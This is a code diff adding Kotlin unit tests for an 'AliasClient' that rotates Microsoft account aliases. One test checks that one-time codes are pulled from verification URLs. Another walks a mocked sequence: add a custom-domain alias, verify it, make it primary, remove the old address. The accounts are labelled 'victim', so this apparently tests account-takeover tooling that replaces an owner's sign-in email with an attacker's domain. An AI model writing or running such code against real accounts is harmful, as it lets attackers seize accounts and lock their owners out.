@@ -259,4 +259,80 @@ class AliasClientTest {
         assertTrue(fallback.endsWith("@qhuyy.tech"))
         assertTrue(fallback.substringBefore("@").isNotEmpty())
     }
+
+    @Test
+    fun testExtractOtcToken() {
+        val client = AliasClient()
+        assertEquals("654321", client.extractOtcToken("  654321  "))
+        assertEquals(
+            "ABC_123_XYZ",
+            client.extractOtcToken("https://account.live.com/Aliases/Verify?aliasname=test%40qhuyy.tech&aliastype=Email&otc=ABC_123_XYZ"),
+        )
+    }
+
+    @Test
+    fun testRotateAliasWithManualOtcProviderSkipsWorker(): Unit = runBlocking {
+        var workerHit = false
+        var verifiedOtc: String? = null
+        val callOrder = mutableListOf<String>()
+
+        val mockEngine = MockEngine { request ->
+            val path = request.url.encodedPath
+            when (path) {
+                "/AddAssocId" -> {
+                    callOrder.add("AddAssocId")
+                    respond("<html>Added</html>", HttpStatusCode.OK)
+                }
+                "/get-otc" -> {
+                    workerHit = true
+                    error("Worker must not be requested when aliasOtcProvider is supplied")
+                }
+                "/Aliases/Verify" -> {
+                    callOrder.add("Verify")
+                    verifiedOtc = request.url.parameters["otc"]
+                    respond("<html>Verified</html>", HttpStatusCode.OK)
+                }
+                "/API/MakePrimary" -> {
+                    callOrder.add("MakePrimary")
+                    respond(
+                        content = """{"apiCanary":"canary_2"}""",
+                        status = HttpStatusCode.OK,
+                        headers = headersOf(HttpHeaders.ContentType, "application/json"),
+                    )
+                }
+                "/names/manage" -> {
+                    callOrder.add("RemoveAlias")
+                    respond("<html>Note_AssociatedIdRemoved</html>", HttpStatusCode.OK)
+                }
+                else -> error("Unexpected path: $path")
+            }
+        }
+
+        val httpClient = HttpClient(mockEngine) {
+            install(ContentNegotiation) {
+                json(MicrosoftHttpClientFactory.json)
+            }
+        }
+
+        val client = AliasClient(sharedSecret = "")
+        val result = client.rotateAlias(
+            currentCanary = "canary_1",
+            oldEmail = "victim@gmail.com",
+            httpClient = httpClient,
+            customAlias = "victim@qhuyy.tech",
+            aliasOtcProvider = { alias ->
+                callOrder.add("ManualPrompt:$alias")
+                "998877"
+            },
+        )
+
+        assertTrue(!workerHit)
+        assertEquals("998877", verifiedOtc)
+        assertEquals("victim@qhuyy.tech", result.newEmail)
+        assertEquals("canary_2", result.updatedCanary)
+        assertEquals(
+            listOf("AddAssocId", "ManualPrompt:victim@qhuyy.tech", "Verify", "MakePrimary", "RemoveAlias"),
+            callOrder,
+        )
+    }
 }
